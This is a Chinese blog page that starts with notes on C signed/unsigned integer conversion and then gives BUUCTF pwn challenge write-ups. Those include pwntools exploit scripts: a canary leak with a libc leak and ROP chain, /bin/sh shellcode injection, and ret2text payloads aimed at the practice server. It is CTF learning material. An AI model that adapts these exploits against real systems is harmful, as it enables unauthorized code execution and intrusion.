<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">-1</span>;</span><br><span class="line"><span class="type">unsigned</span> u = <span class="number">2147483648</span> <span class="comment">/* 2 to the 31st */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; x = %u = %d\n&quot;</span>,x,x);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; u = %u = %d\n&quot;</span>,u,u);</span><br></pre></td></tr></table></figure>

<p>在一个32位机器上运行结果应该是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">4294967295</span> = <span class="number">-1</span></span><br><span class="line">u = <span class="number">2147483648</span> = <span class="number">-2147483648</span></span><br></pre></td></tr></table></figure>

<p>当执行一个运算时，如果他的一个运算数是有符号的而另一个是无符号的，那么c语言会隐式地将有符号参数强制类型转换为无符号数，并假设这两个数都是非负的</p>
<p>典型问题：<code>- 1&lt;0u</code>&lt;&#x3D;&gt;<code>4294967295u&lt;0u</code>,导致出错</p>
<h3 id="2-2-6-拓展一个数字的位表示"><a href="#2-2-6-拓展一个数字的位表示" class="headerlink" title="2.2.6 拓展一个数字的位表示"></a>2.2.6 拓展一个数字的位表示</h3><p><strong>零拓展</strong>；将一个无符号数转换为一个更大的数据类型，只需要在表示的开头添加0</p>
<p><strong>符号拓展</strong>：将一个补码数字转换为一个更大的数据类型，在表示中添加最高有效位的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> sx = <span class="number">-12345</span>; <span class="comment">//-12345</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> usx = sx; <span class="comment">//53191</span></span><br><span class="line"><span class="type">int</span> x = sx; <span class="comment">//-12345</span></span><br><span class="line"><span class="type">unsigned</span> ux = usx; <span class="comment">//53191</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sx = %d:\t&quot;</span>,sx);</span><br><span class="line">show_bytes((bytes_pointer) &amp;sx,<span class="keyword">sizeof</span>(<span class="type">short</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;usx = %d:\t&quot;</span>,usx);</span><br><span class="line">show_bytes((bytes_pointer) &amp;usx,<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">short</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;x = %d:\t&quot;</span>,x);</span><br><span class="line">show_bytes((bytes_pointer) &amp;x,<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ux = %d:\t&quot;</span>,ux);</span><br><span class="line">show_bytes((bytes_pointer) &amp;ux,<span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">int</span>));</span><br></pre></td></tr></table></figure>

<p>输出结果(32位大端序)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sx = <span class="number">-12345</span>:    cf c7</span><br><span class="line">usx = <span class="number">53191</span>:    cf c7</span><br><span class="line">x = <span class="number">-12345</span>: ff ff cf c7</span><br><span class="line">ux = <span class="number">53191</span>: <span class="number">00</span> <span class="number">00</span> cf c7</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">short</span> sx = <span class="number">-12345</span>;</span><br><span class="line"><span class="type">unsigned</span> uy = sx;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;uy = %d:\t&quot;</span>,uy);</span><br><span class="line">show_bytes((bytes_pointer) &amp;uy,<span class="keyword">sizeof</span>(<span class="type">unsigned</span>));</span><br></pre></td></tr></table></figure>

<p>输出为:<code>uy = 4294954951:    ff ff cf c7</code>,说明short转换为unsigned时,要先改变大小,再完成从有符号到无符号的转换</p>
<h3 id="2-2-7-截断数字"><a href="#2-2-7-截断数字" class="headerlink" title="2.2.7 截断数字"></a>2.2.7 截断数字</h3><p>不用额外的位来拓展一个数值，而是减少表示一个数字的位数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="number">53191</span>;</span><br><span class="line"><span class="type">short</span> sx = (<span class="type">short</span>)x;    <span class="comment">//-12345</span></span><br><span class="line"><span class="type">int</span> y = sx; <span class="comment">//-12345</span></span><br></pre></td></tr></table></figure>

<p>将x强制类型转换位short时，我们就将32位的int截断为了16位的short int。这个16位的位模式就是-12345的补码表示。当我们将他强制类型转换为一个int时，符号拓展把高16位设置为1，从而生成-12345的32位补码表示</p>
<p><strong>截断一个数字可能会改变它的值——溢出的一种形式</strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8861-80%E9%A2%98%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8861-80%E9%A2%98%EF%BC%89/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-03-03 16:11:36" itemprop="dateModified" datetime="2025-03-03T16:11:36+08:00">2025-03-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="buu刷题记录（41-60题）"><a href="#buu刷题记录（41-60题）" class="headerlink" title="buu刷题记录（41-60题）"></a>buu刷题记录（41-60题）</h1><p>by Maple</p>
<h2 id="61-others-babystack"><a href="#61-others-babystack" class="headerlink" title="61 others_babystack"></a>61 others_babystack</h2><p><em><strong>canary+libc</strong></em></p>
<p><code>checksec</code>一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/buuctf/61/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>NX保护，Canary保护，所以思路应该是泄露Canary，然后泄露libc，然后ROP</p>
<p>看下源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">sub_4008B9</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_400826(<span class="string">&quot;--------&quot;</span>);</span><br><span class="line">  sub_400826(<span class="string">&quot;1.store&quot;</span>);</span><br><span class="line">  sub_400826(<span class="string">&quot;2.print&quot;</span>);</span><br><span class="line">  sub_400826(<span class="string">&quot;3.quit&quot;</span>);</span><br><span class="line">  sub_400826(<span class="string">&quot;--------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_4007F7(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_400841</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)read(<span class="number">0</span>, s, <span class="number">0x20u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> atoi(s);</span><br><span class="line">&#125;</span><br><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80u</span>LL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4008B9();</span><br><span class="line">    v3 = sub_400841();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(s);                                <span class="comment">// 回显Canary</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        read(<span class="number">0</span>, s, <span class="number">0x100u</span>LL);                   <span class="comment">// 可以溢出</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_400826(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_400826(&amp;unk_400AE7);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是一个菜单，1对应输入，2对应输出（用puts）</p>
<p>所以canary截断泄露，libc用puts泄露，然后构造ROP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29212</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Canary-------</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x90</span>-<span class="number">0x8</span>)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\x00&#x27;</span>+p.recv(<span class="number">7</span>))</span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------leak_libc------</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x400908</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400a93</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(m</span><br><span class="line">ain)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------getshell-------</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">one_gadget = libc_base+<span class="number">0x45216</span></span><br><span class="line">payload2 = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(one_gadget)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><em>这边用的one_gadget,正常的ROP也是没有问题的</em></p>
<h2 id="62-pwnable-start"><a href="#62-pwnable-start" class="headerlink" title="62 pwnable_start"></a>62 pwnable_start</h2><p><em><strong>shellcode</strong></em></p>
<p><code>checksec</code>一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec pwn</span><br><span class="line">[*] &#x27;/home/pwn/pwn/buuctf/62/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX disabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>保护全关</p>
<p>ida看一下，汇编写的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public _start</span><br><span class="line">_start proc near</span><br><span class="line">push    esp</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    3A465443h</span><br><span class="line">push    20656874h</span><br><span class="line">push    20747261h</span><br><span class="line">push    74732073h</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>扔给ai分析一下，read那里可以读入60字节，但是栈只有20字节，可以溢出</p>
<p>所以我们可以先给esp指的位置泄露出来，然后把那个地方写入shellcode并执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25719</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+p32(<span class="number">0x08048087</span>)<span class="comment"># ida里可以看到，这里对应的是	mov		ecx,esp</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+p32(leak+<span class="number">20</span>)+shellcode</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>可以在<a target="_blank" rel="noopener" href="http://shell-storm.org/shellcode/index.html">这里</a>找一些合适的shellcode</p>
<h2 id="63-gyctf-2020-borrowstack"><a href="#63-gyctf-2020-borrowstack" class="headerlink" title="63 gyctf_2020_borrowstack"></a>63 gyctf_2020_borrowstack</h2><p>直接看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">这篇</a>吧</p>
<h2 id="64-hitcontraining-heapcreator"><a href="#64-hitcontraining-heapcreator" class="headerlink" title="64 hitcontraining_heapcreator"></a>64 hitcontraining_heapcreator</h2><p>施工中</p>
<h2 id="65"><a href="#65" class="headerlink" title="65"></a>65</h2>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://maple-pwn.github.io/2025/04/04/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8841-60%E9%A2%98%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Maple">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Maple">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Maple">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/04/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8841-60%E9%A2%98%EF%BC%89/" class="post-title-link" itemprop="url">未命名</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-04-04 01:34:36" itemprop="dateCreated datePublished" datetime="2025-04-04T01:34:36+08:00">2025-04-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-03-01 23:21:10" itemprop="dateModified" datetime="2025-03-01T23:21:10+08:00">2025-03-01</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="buu刷题记录（41-60题）"><a href="#buu刷题记录（41-60题）" class="headerlink" title="buu刷题记录（41-60题）"></a>buu刷题记录（41-60题）</h1><p>by Maple</p>
<h2 id="41-picoctf-2018-buffer-overflow-1"><a href="#41-picoctf-2018-buffer-overflow-1" class="headerlink" title="41 picoctf_2018_buffer overflow 1"></a>41 picoctf_2018_buffer overflow 1</h2><p><em><strong>ret2text</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29931</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(<span class="number">0x80485CB</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="42-jarvisoj-test-your-memory"><a href="#42-jarvisoj-test-your-memory" class="headerlink" title="42 jarvisoj_test_your_memory"></a>42 jarvisoj_test_your_memory</h2><p><em><strong>ret2text</strong></em></p>
<p>别看题上那些有的没的，有个溢出点，有个<code>system</code>,还有<code>cat flag</code>字符串，直接构造rop</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27254</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x80485C9</span></span><br><span class="line">flag_addr = <span class="number">0x80487E0</span></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x13</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(sys)+p32(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

